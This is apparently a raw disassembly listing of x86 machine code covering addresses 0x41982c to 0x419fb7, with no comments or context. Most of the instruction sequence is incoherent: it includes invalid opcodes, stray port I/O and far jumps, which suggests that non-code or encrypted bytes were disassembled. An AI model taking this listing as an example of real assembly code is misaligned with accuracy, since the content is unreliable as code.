  41982c:	test   BYTE PTR [edx],al
  41982e:	out    0x5f,al
  419830:	jmp    0x36fb:0x98a96115
  419837:	ds enter 0x15ba,0x47
  41983c:	in     eax,0xf9
  41983e:	test   BYTE PTR [eax+0x2f9feb1b],bl
  419844:	enter  0x227f,0x13
  419848:	popa   
  419849:	jnp    0x419836
  41984b:	mov    dl,BYTE PTR [edx+0x5e6e9b14]
  419851:	mov    DWORD PTR [eax],ecx
  419853:	je     0x41987d
  419855:	jnp    0x4198ce
  419857:	cmp    bh,BYTE PTR [edi-0x48]
  41985a:	or     bh,BYTE PTR [eax+edi*4]
  41985d:	cmp    ch,ch
  41985f:	mov    ds:0x4372a1a8,eax
  419864:	(bad)  
  419865:	cmc    
  419866:	(bad)  
  419867:	pop    ds
  419868:	add    cl,bl
  41986a:	sub    BYTE PTR [edx+0x139bc565],ch
  419870:	fist   DWORD PTR [edx]
  419872:	dec    edi
  419873:	rol    DWORD PTR [ebx+0x3d],1
  419876:	ins    BYTE PTR es:[edi],dx
  419877:	dec    esp
  419878:	mov    ecx,0x5d946bc1
  41987d:	call   0x620f:0xd83be95
  419884:	xchg   esi,eax
  419885:	mov    ds:0xc11bde3b,al
  41988a:	jns    0x419836
  41988c:	das    
  41988d:	pop    ebx
  41988e:	pop    ss
  41988f:	jnp    0x419836
  419891:	es cdq 
  419893:	aaa    
  419894:	fsubr  QWORD PTR [eax-0x241e76d5]
  41989a:	inc    esp
  41989b:	xchg   ebp,eax
  41989c:	xor    edi,edx
  41989e:	jae    0x419877
  4198a0:	call   0x1d336830
  4198a5:	push   ds
  4198a6:	test   cl,dh
  4198a8:	push   edx
  4198a9:	add    al,0x6d
  4198ab:	rol    DWORD PTR [edx+0x71],cl
  4198ae:	mov    ds:0x74700058,eax
  4198b3:	mov    ecx,DWORD PTR [edx-0x65]
  4198b6:	dec    ecx
  4198b7:	loopne 0x4198d1
  4198b9:	xchg   edi,eax
  4198ba:	cmc    
  4198bb:	add    eax,0x99b6e73
  4198c0:	mov    bl,0x87
  4198c2:	push   ebp
  4198c3:	retf   
  4198c4:	ret    0x56ee
  4198c7:	dec    edi
  4198c8:	stos   BYTE PTR es:[edi],al
  4198c9:	(bad)  
  4198ca:	sub    al,0xd2
  4198cc:	jle    0x419867
  4198ce:	pop    edi
  4198cf:	leave  
  4198d0:	jb     0x419928
  4198d2:	out    dx,eax
  4198d3:	xlat   BYTE PTR ds:[ebx]
  4198d4:	pop    ebp
  4198d5:	out    dx,al
  4198d6:	jns    0x419912
  4198d8:	mov    bl,0xd0
  4198da:	int3   
  4198db:	xchg   edi,eax
  4198dc:	enter  0x42e6,0xc5
  4198e0:	fiadd  WORD PTR [eax+0xb]
  4198e3:	and    ch,BYTE PTR [eax+0x9]
  4198e6:	jmp    0x816e:0xeee62415
  4198ed:	xchg   BYTE PTR [edi-0x746b194d],bl
  4198f3:	and    dh,dh
  4198f5:	add    BYTE PTR [ecx+0x29],0x40
  4198f9:	and    DWORD PTR ds:0x191ba6a8,ebx
  4198ff:	dec    esp
  419900:	aas    
  419901:	or     al,0x21
  419903:	push   edi
  419904:	ja     0x41992b
  419906:	sbb    esp,edi
  419908:	pop    esi
  419909:	sub    al,cl
  41990b:	ins    BYTE PTR es:[edi],dx
  41990c:	pop    edx
  41990d:	dec    esp
  41990e:	dec    eax
  41990f:	dec    esi
  419910:	hlt    
  419911:	push   esp
  419912:	or     eax,0xff21a7a2
  419917:	mov    eax,0xf5264fd8
  41991c:	and    eax,0x9bfd1909
  419921:	push   ecx
  419922:	nop
  419923:	and    eax,0xa8aafe42
  419928:	sub    al,0xf3
  41992a:	nop
  41992b:	mov    edi,0x75375718
  419930:	xchg   ebp,eax
  419931:	dec    esp
  419932:	inc    eax
  419933:	test   dl,al
  419935:	(bad)  
  419938:	iret   
  419939:	mov    al,0x1e
  41993b:	jmp    0x4199b0
  41993d:	push   edx
  41993e:	popf   
  41993f:	aaa    
  419940:	test   al,0xa5
  419942:	cmp    al,0x44
  419944:	add    al,0x4e
  419946:	cmp    BYTE PTR [eax-0x4c],ah
  419949:	lds    ebx,FWORD PTR [ecx]
  41994b:	push   ecx
  41994c:	mov    cl,0x59
  41994e:	or     eax,0x118800ea
  419953:	push   eax
  419954:	jb     0x419977
  419956:	cs jae 0x41997b
  419959:	mov    bh,0x6f
  41995b:	retf   0x8285
  41995e:	icebp  
  41995f:	stos   DWORD PTR es:[edi],eax
  419960:	and    DWORD PTR [esi+edi*4],ebx
  419963:	pop    esi
  419964:	jo     0x419985
  419966:	sub    ecx,DWORD PTR ds:0x41e73953
  41996c:	and    ah,bh
  41996e:	test   BYTE PTR [ebp+0x41],bh
  419971:	iret   
  419972:	adc    BYTE PTR [edi+0x79],al
  419975:	mov    esi,0x2e32b101
  41997a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41997c:	addr16 pop ds
  41997e:	arpl   WORD PTR [edi+0x74],ax
  419981:	pop    ss
  419982:	shl    DWORD PTR [ecx],cl
  419984:	fisubr DWORD PTR [ebx-0x1dce1ea6]
  41998a:	push   ds
  41998b:	fldz   
  41998d:	inc    esi
  41998e:	aam    0x32
  419990:	jg     0x4199c7
  419992:	test   BYTE PTR [ebp+0x2742697d],0x5a
  419999:	es pop esp
  41999b:	int3   
  41999c:	adc    cl,BYTE PTR ds:0x844c24ae
  4199a2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4199a4:	cdq    
  4199a5:	sar    ecx,1
  4199a7:	cld    
  4199a8:	xchg   esp,eax
  4199a9:	cmp    al,0xdf
  4199ab:	mov    eax,0x840d737b
  4199b0:	sbb    BYTE PTR [eax-0x39cb306f],ch
  4199b6:	add    eax,0x52b5e808
  4199bb:	pusha  
  4199bc:	inc    edi
  4199bd:	push   es
  4199be:	cmp    ebx,DWORD PTR [eax-0x3e]
  4199c1:	mov    esi,0x4dbb1f75
  4199c6:	sbb    bl,BYTE PTR [esi]
  4199c8:	fisubr DWORD PTR [edx-0x23303b50]
  4199ce:	hlt    
  4199cf:	xor    eax,0x82fab097
  4199d4:	test   al,0x0
  4199d6:	push   es
  4199d7:	mov    eax,0xb52da4d5
  4199dc:	mov    ds:0xed34fd74,al
  4199e1:	pop    edi
  4199e2:	popf   
  4199e3:	push   ds
  4199e4:	jbe    0x419a11
  4199e6:	and    BYTE PTR [ecx-0x78614951],dh
  4199ec:	mov    esi,0xb98e7b44
  4199f1:	dec    eax
  4199f2:	or     eax,0xcc92a619
  4199f7:	jmp    DWORD PTR [eax-0x7a6f9235]
  4199fd:	jne    0x419a3b
  4199ff:	push   edx
  419a00:	and    ecx,edi
  419a02:	ffreep st(6)
  419a04:	mov    edx,esi
  419a06:	sar    dh,1
  419a08:	test   dl,dl
  419a0a:	sub    eax,0x7f41d022
  419a0f:	outs   dx,DWORD PTR ds:[esi]
  419a10:	shr    BYTE PTR [edx],0x73
  419a13:	test   BYTE PTR [ecx+0x211eb6c3],bl
  419a19:	xor    al,0x2d
  419a1b:	cmp    ebp,DWORD PTR [esi-0x35]
  419a1e:	lods   al,BYTE PTR ds:[esi]
  419a1f:	and    ebx,edx
  419a21:	idiv   DWORD PTR [edx]
  419a23:	imul   ebp,DWORD PTR [ebx],0x71
  419a26:	inc    ecx
  419a27:	jne    0x4199f7
  419a29:	int3   
  419a2a:	jmp    0xb0029d65
  419a2f:	mov    cl,0xbf
  419a31:	scas   al,BYTE PTR es:[edi]
  419a32:	leave  
  419a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a34:	stos   DWORD PTR es:[edi],eax
  419a35:	pop    eax
  419a36:	fbld   TBYTE PTR [edx-0x6d99cda6]
  419a3c:	lock in eax,dx
  419a3e:	fnstsw WORD PTR [eax-0x6]
  419a41:	(bad)  
  419a42:	call   0xc742e513
  419a47:	call   0xb3efd97e
  419a4c:	retf   
  419a4d:	and    eax,0x923154ce
  419a52:	loope  0x419a81
  419a54:	xor    cl,dh
  419a56:	cmp    BYTE PTR [eax-0x42],dh
  419a59:	mov    bh,0x32
  419a5b:	shl    BYTE PTR [esi-0x7ac142c0],0x11
  419a62:	jp     0x419ab2
  419a64:	shl    edi,cl
  419a66:	test   al,0x3e
  419a68:	(bad)  
  419a6a:	ss ds jno 0x419a0e
  419a6e:	or     BYTE PTR [ebx+0x47eae2d1],bh
  419a74:	fsubr  QWORD PTR es:[eax+0x35]
  419a78:	ds inc ebx
  419a7a:	call   0xa316235f
  419a7f:	ja     0x419af1
  419a81:	ja     0x419aba
  419a83:	inc    ebx
  419a84:	mov    edi,0x9f3ed647
  419a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a8a:	add    esi,DWORD PTR [ebx+0x31]
  419a8d:	lods   al,BYTE PTR ds:[esi]
  419a8e:	mov    DWORD PTR ds:0xfdb1d6d1,edx
  419a94:	pop    ebp
  419a95:	lock inc ebp
  419a97:	nop
  419a98:	dec    esp
  419a99:	and    eax,0x8a1585b9
  419a9e:	jno    0x419aa4
  419aa0:	jg     0x419a67
  419aa2:	in     eax,dx
  419aa3:	lds    eax,FWORD PTR es:[ebp-0x76]
  419aa7:	pop    edx
  419aa8:	lods   al,BYTE PTR ds:[esi]
  419aa9:	(bad)  
  419aaa:	repz mov eax,0x37839ef5
  419ab0:	lods   al,BYTE PTR ds:[esi]
  419ab1:	out    dx,al
  419ab2:	jmp    0x419a65
  419ab4:	and    dl,BYTE PTR [edi-0x1a451d63]
  419aba:	js     0x419af9
  419abc:	add    eax,DWORD PTR [ebx]
  419abe:	fadd   DWORD PTR [ebx]
  419ac0:	loope  0x419af5
  419ac2:	pop    ebp
  419ac3:	add    al,0x16
  419ac5:	push   ecx
  419ac6:	sub    eax,0x85204e3
  419acb:	imul   ebp,ecx,0xffffffd5
  419ace:	sub    al,0x13
  419ad0:	jmp    0x22bd9ab2
  419ad5:	cmc    
  419ad6:	loop   0x419b4a
  419ad8:	xchg   ecx,eax
  419ad9:	stc    
  419ada:	gs inc edx
  419adc:	dec    edx
  419add:	jb     0x419a8c
  419adf:	rol    BYTE PTR [ecx-0x2e],1
  419ae2:	nop
  419ae3:	or     ebp,0xffffffd8
  419ae6:	sub    ah,BYTE PTR [edx-0x23df9244]
  419aec:	stos   DWORD PTR es:[edi],eax
  419aed:	ins    BYTE PTR es:[edi],dx
  419aee:	inc    ecx
  419aef:	xchg   BYTE PTR [esi-0x23],cl
  419af2:	xor    edx,DWORD PTR [ebp+0xc472585]
  419af8:	outs   dx,BYTE PTR ds:[esi]
  419af9:	lods   al,BYTE PTR ds:[esi]
  419afa:	aam    0x43
  419afc:	sti    
  419afd:	or     eax,0x7404c4f5
  419b02:	sahf   
  419b03:	hlt    
  419b04:	xchg   esp,eax
  419b05:	mov    al,0x3c
  419b07:	test   BYTE PTR [ecx-0x2a59fe7e],dh
  419b0d:	out    dx,al
  419b0e:	push   eax
  419b0f:	pop    ds
  419b10:	and    al,0x9d
  419b12:	enter  0x7b6e,0x33
  419b16:	in     al,0x9f
  419b18:	aam    0xf8
  419b1a:	jmp    0x419b55
  419b1c:	push   0x2c1cc2d3
  419b21:	and    bh,BYTE PTR [ebp-0x5e]
  419b24:	pop    ebp
  419b25:	mov    ebp,0x2937d5f5
  419b2a:	sub    BYTE PTR [edi-0x75927b02],bl
  419b30:	sbb    ebx,edx
  419b32:	sub    al,0x86
  419b34:	scas   al,BYTE PTR es:[edi]
  419b35:	fnsave [ecx+ebx*1-0x75c9df5d]
  419b3c:	mov    ecx,0x499e3252
  419b41:	test   DWORD PTR [edx+0x57],eax
  419b44:	(bad)  
  419b45:	int3   
  419b46:	push   esi
  419b47:	mov    eax,0x4f2739d3
  419b4c:	fcmovbe st,st(6)
  419b4e:	pushf  
  419b4f:	cmp    DWORD PTR [edi-0x17],eax
  419b52:	fdivr  DWORD PTR [ebx+eiz*4+0x450c81fc]
  419b59:	xchg   esi,eax
  419b5a:	test   BYTE PTR [edi+0x77],bh
  419b5d:	mov    ebp,0xda237b54
  419b62:	ret    0xa552
  419b65:	ins    BYTE PTR es:[edi],dx
  419b66:	call   DWORD PTR [edi+eax*8]
  419b69:	scas   eax,DWORD PTR es:[edi]
  419b6a:	scas   eax,DWORD PTR es:[edi]
  419b6b:	(bad)  
  419b6c:	push   ecx
  419b6d:	pop    ecx
  419b6e:	and    BYTE PTR [esi],cl
  419b70:	fisubr DWORD PTR ds:0x19dcb62b
  419b76:	outs   dx,DWORD PTR ds:[esi]
  419b77:	mov    ds:0x3bbd3f6a,eax
  419b7c:	inc    edx
  419b7d:	loopne 0x419bfa
  419b7f:	add    al,0x86
  419b81:	push   eax
  419b82:	ffreep st(5)
  419b84:	clc    
  419b85:	or     cl,dh
  419b87:	clc    
  419b88:	and    BYTE PTR ds:0xf88b47da,0x5a
  419b8f:	bnd jp 0x419ba9
  419b92:	out    dx,al
  419b93:	mov    dh,0x50
  419b95:	(bad)  [esi+ebp*4-0x95270ed]
  419b9c:	(bad)  
  419b9d:	and    ch,BYTE PTR [esi]
  419b9f:	bound  edx,QWORD PTR [esi+edx*4-0x2f]
  419ba3:	sbb    al,0x3c
  419ba5:	pusha  
  419ba6:	push   edx
  419ba7:	(bad)  
  419ba9:	shl    cl,1
  419bab:	(bad)  
  419bac:	bswap  ecx
  419bae:	mov    ch,0xe5
  419bb0:	or     eax,0x638a6638
  419bb5:	pop    ebp
  419bb6:	xchg   edx,eax
  419bb7:	push   cs
  419bb8:	clc    
  419bb9:	pop    esp
  419bba:	dec    esp
  419bbb:	das    
  419bbc:	xor    ch,al
  419bbe:	jns    0x419bb3
  419bc0:	neg    DWORD PTR [edx+0x5a]
  419bc3:	xchg   esp,eax
  419bc4:	dec    ecx
  419bc5:	jns    0x419b95
  419bc7:	pushf  
  419bc8:	clc    
  419bc9:	and    al,0xe1
  419bcb:	add    eax,edx
  419bcd:	pop    edx
  419bce:	outs   dx,DWORD PTR ds:[esi]
  419bcf:	pop    ss
  419bd0:	push   cs
  419bd1:	pusha  
  419bd2:	retf   0x7ff3
  419bd5:	push   esi
  419bd6:	cdq    
  419bd7:	mov    eax,0x9d48edbb
  419bdc:	jno    0x419be1
  419bde:	jg     0x419b85
  419be0:	add    eax,ebp
  419be2:	iret   
  419be3:	jmp    0x107a:0x75555980
  419bea:	outs   dx,BYTE PTR ds:[esi]
  419beb:	mov    ds:0x3b0c453e,al
  419bf0:	lahf   
  419bf1:	mov    ecx,0x659212e6
  419bf6:	push   esp
  419bf7:	or     BYTE PTR [ebp-0x8d5670],cl
  419bfd:	and    cl,cl
  419bff:	mov    edx,0x4706b120
  419c04:	sbb    eax,DWORD PTR [edi-0x2f]
  419c07:	into   
  419c08:	mov    ecx,0xa3e5f5f9
  419c0d:	fcmovnu st,st(3)
  419c0f:	loope  0x419c1f
  419c11:	call   0x2424:0xf15c60e4
  419c18:	mul    DWORD PTR [ebx-0x36]
  419c1b:	sbb    eax,DWORD PTR [edi+0x44]
  419c1e:	add    ch,BYTE PTR [ecx+eiz*8+0x50]
  419c22:	and    bl,BYTE PTR [edi-0x47]
  419c25:	adc    edx,DWORD PTR [edi+0x49]
  419c28:	cmp    dh,ah
  419c2a:	mov    bl,0x34
  419c2c:	sub    edi,esp
  419c2e:	ret    
  419c2f:	inc    eax
  419c30:	adc    ecx,ebx
  419c32:	cmp    bh,ch
  419c34:	jbe    0x419c30
  419c36:	retf   
  419c37:	les    ecx,FWORD PTR [edi-0x57a3cc2]
  419c3d:	int3   
  419c3e:	xlat   BYTE PTR ds:[ebx]
  419c3f:	mov    ds:0xf48fe453,eax
  419c44:	and    cl,BYTE PTR [edx+0x6b]
  419c47:	daa    
  419c48:	mov    edi,0xb4cab919
  419c4d:	push   esi
  419c4e:	out    dx,al
  419c4f:	fisubr DWORD PTR [ebp-0x6d90be8e]
  419c55:	mov    BYTE PTR [ebp+0x6f],bl
  419c58:	repz and ebx,DWORD PTR [ebx-0x45d3524f]
  419c5f:	lahf   
  419c60:	ins    BYTE PTR es:[edi],dx
  419c61:	add    al,BYTE PTR [esi]
  419c63:	xor    esp,DWORD PTR [edi]
  419c65:	daa    
  419c66:	or     DWORD PTR [eax],ebx
  419c68:	sub    eax,0x4a40bf8d
  419c6d:	xchg   edi,eax
  419c6e:	(bad)  
  419c6f:	(bad)  
  419c70:	rcr    BYTE PTR [ebp+0x2f],0xd5
  419c74:	daa    
  419c75:	and    BYTE PTR [eax-0x553d241f],al
  419c7b:	xor    al,0xd9
  419c7d:	jge    0x419c8f
  419c7f:	inc    ebx
  419c80:	mov    eax,0xefba4f7a
  419c85:	and    eax,0x7f217b50
  419c8a:	test   DWORD PTR [esi-0x54],eax
  419c8d:	stos   BYTE PTR es:[edi],al
  419c8e:	jle    0x419c73
  419c90:	xor    BYTE PTR [ebx+0x7b0145c],0xac
  419c97:	add    bh,BYTE PTR [ebx]
  419c99:	aas    
  419c9a:	sub    ecx,edi
  419c9c:	mov    ch,0x57
  419c9e:	sar    ebp,1
  419ca0:	jne    0x419c55
  419ca2:	fst    QWORD PTR [ebx+ecx*8]
  419ca5:	mov    dl,0x8
  419ca7:	cmp    esi,DWORD PTR [esi+eiz*2+0x8]
  419cab:	or     bh,bh
  419cad:	fwait
  419cae:	xchg   DWORD PTR [esi-0x49],eax
  419cb1:	sub    al,0x1c
  419cb3:	ins    BYTE PTR es:[edi],dx
  419cb4:	cmp    DWORD PTR [esi-0x3bf9121],edx
  419cba:	gs sbb al,0x9
  419cbd:	xcrypt-cbc (bad)
  419cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cbf:	push   ebp
  419cc0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cc2:	lea    esi,[edx]
  419cc4:	jp     0x419c8d
  419cc6:	pop    eax
  419cc7:	cmp    DWORD PTR es:[edx-0x5e],ebp
  419ccb:	cli    
  419ccc:	lea    ecx,[eax+0x59c91901]
  419cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cd3:	fbstp  TBYTE PTR [edi+0x48]
  419cd6:	fild   QWORD PTR [eax+0x2e]
  419cd9:	pop    esi
  419cda:	push   esi
  419cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cdc:	adc    eax,0xe074a2e6
  419ce1:	sbb    esi,DWORD PTR [ecx-0x4a3c45f8]
  419ce7:	push   es
  419ce8:	xor    ecx,esi
  419cea:	jns    0x419d67
  419cec:	add    BYTE PTR [esi+0x14],bl
  419cef:	hlt    
  419cf0:	aas    
  419cf1:	sbb    al,0xfd
  419cf3:	retf   0x9649
  419cf6:	dec    esp
  419cf7:	push   edi
  419cf8:	data16 mov BYTE PTR [esi+0x387186e4],dh
  419cff:	shl    ebp,0x22
  419d02:	cwde   
  419d03:	mov    DWORD PTR [edi+edi*8],eax
  419d06:	enter  0x3bd1,0x21
  419d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d0b:	inc    esi
  419d0c:	inc    ecx
  419d0d:	test   al,0x95
  419d0f:	xor    BYTE PTR [edx],0xaf
  419d12:	not    BYTE PTR [ecx+0x5b]
  419d15:	test   eax,0xb1aee7d3
  419d1a:	daa    
  419d1b:	adc    BYTE PTR [ebx+ecx*8-0x59e5b026],ah
  419d22:	push   0xece91df4
  419d27:	(bad)  
  419d28:	xchg   edx,eax
  419d29:	(bad)  
  419d2a:	and    eax,0xd5e33c45
  419d2f:	add    eax,0x680f4974
  419d34:	fnstcw WORD PTR [edi+0x42cae916]
  419d3a:	or     BYTE PTR ds:[esi+0x76],dh
  419d3e:	std    
  419d3f:	ret    
  419d40:	add    al,0x1b
  419d42:	push   cs
  419d43:	xchg   BYTE PTR [eax],dh
  419d45:	mov    DWORD PTR [edi+0x20dadd22],ebx
  419d4b:	arpl   sp,si
  419d4d:	dec    esp
  419d4e:	xchg   ebp,eax
  419d4f:	nop
  419d50:	mov    bl,0xb7
  419d52:	cmp    esi,ecx
  419d54:	in     eax,0x1e
  419d56:	fidivr WORD PTR [esp+edx*1+0x48b161c2]
  419d5d:	mov    ecx,0xdeb44b93
  419d62:	xchg   edi,eax
  419d63:	loope  0x419d2b
  419d65:	aaa    
  419d66:	fist   WORD PTR [edi+0x3b]
  419d69:	add    cl,dh
  419d6b:	outs   dx,BYTE PTR ds:[esi]
  419d6c:	push   ecx
  419d6d:	add    ch,BYTE PTR [ebp-0x693d38c9]
  419d73:	add    eax,0xec343638
  419d78:	test   ch,bl
  419d7a:	xor    DWORD PTR [eax+0x46dfe4e2],0xd75345aa
  419d84:	sbb    DWORD PTR [ebp-0x5c],esi
  419d87:	pushf  
  419d88:	mov    esi,0x176d5d90
  419d8d:	lea    edx,[ecx]
  419d8f:	popf   
  419d90:	xor    edx,DWORD PTR [edi]
  419d92:	sti    
  419d93:	mov    eax,ds:0xf26046e4
  419d98:	xor    ch,BYTE PTR [edi-0xe]
  419d9b:	mov    ?,WORD PTR [ebx-0x2d5418e4]
  419da1:	sbb    al,0x30
  419da3:	xchg   ebx,eax
  419da4:	mov    ebp,edx
  419da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419da7:	stc    
  419da8:	call   FWORD PTR [edi-0x2373ece6]
  419dae:	je     0x419d89
  419db0:	loopne 0x419dcc
  419db2:	(bad)  
  419db3:	(bad)  
  419db4:	jle    0x419e21
  419db6:	inc    eax
  419db7:	stc    
  419db8:	jle    0x419d8d
  419dba:	xchg   esp,eax
  419dbb:	push   DWORD PTR [edi+0x53]
  419dbe:	idiv   DWORD PTR [eax-0x5d]
  419dc1:	mov    DWORD PTR [edi+0x7fc5ab9d],ecx
  419dc7:	push   es
  419dc8:	std    
  419dc9:	dec    edi
  419dca:	sahf   
  419dcb:	mov    esi,0xf06a35af
  419dd0:	imul   esp,DWORD PTR [edi+0xd],0x4d
  419dd4:	stos   DWORD PTR es:[edi],eax
  419dd5:	repnz or eax,0x8c2be47c
  419ddb:	stos   DWORD PTR es:[edi],eax
  419ddc:	dec    esp
  419ddd:	dec    esp
  419dde:	pop    esp
  419ddf:	into   
  419de0:	iret   
  419de1:	pcmpeqd mm6,QWORD PTR [edx-0x483d9b03]
  419de8:	xchg   ebx,eax
  419de9:	and    BYTE PTR [edi],bl
  419deb:	sub    BYTE PTR [esi],0xdd
  419dee:	jo     0x419e21
  419df0:	add    ebx,DWORD PTR [ebx-0x34b1f77e]
  419df6:	std    
  419df7:	inc    esp
  419df8:	ss inc esp
  419dfa:	push   ecx
  419dfb:	xchg   esp,eax
  419dfc:	mov    eax,cs
  419dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dff:	cmp    bl,BYTE PTR [ecx-0x1255bf8]
  419e05:	sbb    BYTE PTR [eax],0x6b
  419e08:	lods   eax,DWORD PTR es:[esi]
  419e0a:	jmp    0x419e20
  419e0c:	loop   0x419e22
  419e0e:	mov    ah,0xdf
  419e10:	mov    ss,esi
  419e12:	or     DWORD PTR [ecx],ebp
  419e14:	stos   DWORD PTR es:[edi],eax
  419e15:	test   eax,0xc908fa70
  419e1a:	adc    al,0xa7
  419e1c:	scas   al,BYTE PTR es:[edi]
  419e1d:	cmp    DWORD PTR ds:0x5e7e65b4,edi
  419e23:	mov    ebp,0xd0aa985a
  419e28:	ficom  WORD PTR [ebx]
  419e2a:	scas   eax,DWORD PTR es:[edi]
  419e2b:	mov    bl,0x5e
  419e2d:	push   ecx
  419e2e:	lahf   
  419e2f:	int3   
  419e30:	mov    BYTE PTR [ebx-0x7e],dl
  419e33:	shr    BYTE PTR [edi+0x2c],cl
  419e36:	add    bh,BYTE PTR [eax]
  419e38:	and    esi,DWORD PTR [esi-0x710a2634]
  419e3e:	jmp    0x419df2
  419e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e41:	push   0x54
  419e43:	xor    bh,BYTE PTR [ecx]
  419e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e47:	sbb    eax,DWORD PTR [edi+eiz*2]
  419e4a:	push   esp
  419e4b:	mov    WORD PTR [ebx-0xef5d4d2],es
  419e51:	xor    DWORD PTR [eax-0x2ec794cf],ebx
  419e57:	call   0x35dd:0xd78a874a
  419e5e:	push   es
  419e5f:	jo     0x419e07
  419e61:	imul   edx,DWORD PTR [ecx-0x20],0xc94ebca9
  419e68:	imul   esi,DWORD PTR [ebx],0xc80befec
  419e6e:	mov    al,0x4
  419e70:	fld    TBYTE PTR [ebx+0x176c731d]
  419e76:	adc    DWORD PTR [edx],0x45
  419e79:	and    eax,0xd953be03
  419e7e:	adc    DWORD PTR [eax],esp
  419e80:	in     eax,0xe0
  419e82:	mov    ds:0x29fbfc82,eax
  419e87:	jg     0x419e55
  419e89:	(bad)  
  419e8a:	mov    edi,0x2d71e282
  419e8f:	cmc    
  419e90:	daa    
  419e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e92:	xchg   BYTE PTR [ebp-0x3c550ab5],cl
  419e98:	sahf   
  419e99:	in     eax,0x4b
  419e9b:	mov    edi,0xdae0abfd
  419ea0:	mov    esi,0xf678138c
  419ea5:	mov    ecx,0x851eef46
  419eaa:	scas   al,BYTE PTR es:[edi]
  419eab:	lods   eax,DWORD PTR ds:[esi]
  419eac:	imul   eax,DWORD PTR [esi-0x36fe945e],0x5a9b8746
  419eb6:	or     DWORD PTR [esi],edx
  419eb8:	cmc    
  419eb9:	jb     0x419ea1
  419ebb:	pop    edx
  419ebc:	retf   0xeb4
  419ebf:	pop    edx
  419ec0:	fwait
  419ec1:	loope  0x419ee2
  419ec3:	push   esi
  419ec4:	mov    dh,0xb9
  419ec6:	add    eax,0x9ca01cdd
  419ecb:	jo     0x419f07
  419ecd:	jge    0x419efc
  419ecf:	lods   eax,DWORD PTR ds:[esi]
  419ed0:	pusha  
  419ed1:	or     esi,DWORD PTR [esi+0x5e]
  419ed4:	sbb    al,0x9e
  419ed6:	cli    
  419ed7:	cmp    BYTE PTR [esi+eax*1+0x1a],al
  419edb:	int3   
  419edc:	lods   eax,DWORD PTR ds:[esi]
  419edd:	int    0xf9
  419edf:	mov    edx,0x3df6614e
  419ee4:	mov    cl,0xa8
  419ee6:	xlat   BYTE PTR ds:[ebx]
  419ee7:	in     eax,0x6e
  419ee9:	adc    al,0xa5
  419eeb:	stc    
  419eec:	sbb    al,BYTE PTR [esi]
  419eee:	pushf  
  419eef:	xor    ch,dl
  419ef1:	imul   ebp,DWORD PTR [ecx-0x8],0x5
  419ef5:	addr16 push es
  419ef7:	(bad)  
  419ef9:	(bad)  
  419efa:	and    ch,BYTE PTR [esi+0xf9177a7]
  419f00:	and    BYTE PTR [edi-0x41074013],al
  419f06:	mov    ch,0xbe
  419f08:	imul   ecx,esp,0xffffffb3
  419f0b:	jb     0x419f6e
  419f0d:	stos   DWORD PTR es:[edi],eax
  419f0e:	sti    
  419f0f:	adc    dh,bl
  419f11:	cmc    
  419f12:	stos   DWORD PTR es:[edi],eax
  419f13:	add    eax,0x2204f11f
  419f18:	inc    eax
  419f19:	pop    ebx
  419f1a:	xchg   ebx,eax
  419f1b:	fimul  WORD PTR [esi-0x52]
  419f1e:	add    eax,0x50
  419f21:	cmp    dh,al
  419f23:	jecxz  0x419edc
  419f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f26:	jecxz  0x419f70
  419f28:	rcr    ebx,0x74
  419f2b:	stc    
  419f2c:	mov    bl,0xc6
  419f2e:	ror    DWORD PTR [ebp-0x1c97b1d3],0x16
  419f35:	pop    edx
  419f36:	cmp    BYTE PTR [ebx],bl
  419f38:	or     eax,0xa013ed68
  419f3d:	loopne 0x419f03
  419f3f:	addr16 aam 0xdf
  419f42:	xchg   esi,eax
  419f43:	pop    ecx
  419f44:	(bad)  
  419f45:	xor    al,0x6e
  419f47:	jbe    0x419f1c
  419f49:	scas   eax,DWORD PTR es:[edi]
  419f4a:	js     0x419fc2
  419f4c:	mul    BYTE PTR [edi]
  419f4e:	out    dx,al
  419f4f:	fdivr  st,st(4)
  419f51:	add    ah,bh
  419f53:	int3   
  419f54:	fs mov ebx,0x817a3ba
  419f5a:	stos   BYTE PTR es:[edi],al
  419f5b:	jbe    0x419f0a
  419f5d:	rcl    BYTE PTR [eax],1
  419f5f:	mov    ah,0x6e
  419f61:	mov    ecx,0x9c49cb3b
  419f66:	sbb    BYTE PTR [esi],dl
  419f68:	mov    esp,0x5ed6ebc5
  419f6d:	dec    ebx
  419f6e:	pop    edx
  419f6f:	xchg   ebx,eax
  419f70:	imul   ecx,DWORD PTR [ebx-0x5c],0x51
  419f74:	nop
  419f75:	jbe    0x419f06
  419f77:	pop    eax
  419f78:	sub    al,0xe2
  419f7a:	nop
  419f7b:	sbb    edi,DWORD PTR [edx+0x3]
  419f7e:	nop
  419f7f:	mov    BYTE PTR [edi-0x6dc8daf6],bl
  419f85:	cwde   
  419f86:	in     eax,dx
  419f87:	in     eax,dx
  419f88:	pop    ss
  419f89:	xor    eax,DWORD PTR [eax-0x53ac67f0]
  419f8f:	jne    0x419fb2
  419f91:	sub    al,0xfd
  419f93:	call   0x1c59:0x824c4b6b
  419f9a:	sahf   
  419f9b:	and    DWORD PTR [edx+ebp*2],esi
  419f9e:	mov    cl,0xe4
  419fa0:	mul    DWORD PTR [edx-0x44289893]
  419fa6:	popa   
  419fa7:	sbb    DWORD PTR [ecx+0x76],esp
  419faa:	dec    ecx
  419fab:	aad    0xca
  419fad:	inc    ebp
  419fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419faf:	aam    0xbf
  419fb1:	adc    al,0x9a
  419fb3:	jbe    0x419fa4
  419fb5:	clc    
  419fb6:	scas   eax,DWORD PTR es:[edi]
  419fb7:	popf   
